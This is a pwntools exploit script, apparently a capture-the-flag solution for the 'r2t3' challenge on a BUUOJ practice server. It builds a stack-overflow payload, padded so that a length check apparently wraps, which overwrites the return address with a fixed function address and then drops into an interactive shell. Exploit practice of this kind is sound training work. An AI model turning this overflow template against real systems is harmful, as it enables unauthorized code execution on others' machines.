#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "r2t3"
libFile  = ""


remoteIp = "node3.buuoj.cn"
remotePort = 28513

LOCAL = 0
LIBC  = 0

r   =  lambda   : io.recv()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	sys_addr = 0x0804858B
	ru(':')
	p = 'A' * 0x11
	p += p32(0x11111111) + p32(sys_addr)
	p = p.ljust(0x103, 'C')
	#db()
	sl(p)
	#li(rl())
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIBC:
			libc = ELF(libFile)
		io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		io = remote(remoteIp, remotePort)
		if LIBC:
			libc = ELF(libFile)
	
	exploit()
	finish()
    
